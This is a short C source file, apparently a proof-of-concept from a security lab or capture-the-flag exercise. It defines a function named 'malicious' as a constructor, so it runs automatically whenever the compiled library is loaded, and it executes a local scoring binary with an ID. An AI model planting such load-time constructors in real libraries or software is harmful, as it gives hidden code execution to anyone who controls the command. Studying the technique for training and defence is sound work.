#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score fbfa0129-c725-4855-8433-e85f45893410");
}
